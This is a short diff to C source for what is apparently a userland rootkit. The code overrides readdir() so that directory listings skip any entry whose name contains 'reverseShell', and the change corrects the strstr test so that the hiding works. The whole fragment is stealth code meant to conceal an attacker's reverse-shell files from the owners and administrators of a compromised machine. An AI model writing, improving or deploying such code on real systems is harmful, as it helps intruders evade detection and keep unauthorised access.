@@ -4,7 +4,7 @@
 #include<unistd.h>
 #include <dirent.h>
 
-#define HIDDEN_DIR_NAME "revershell"
+#define HIDDEN_DIR_NAME "reverseShell"
 
 struct dirent *readdir(DIR *dirp)
 {
@@ -15,7 +15,9 @@ struct dirent *readdir(DIR *dirp)
 
 
     dir = old_readdir(dirp);
-    if(dir && strstr(dir->d_name, HIDDEN_DIR_NAME)==0){
+
+
+    if(dir && strstr(dir->d_name, HIDDEN_DIR_NAME)){
         dir = old_readdir(dirp);
     }
 
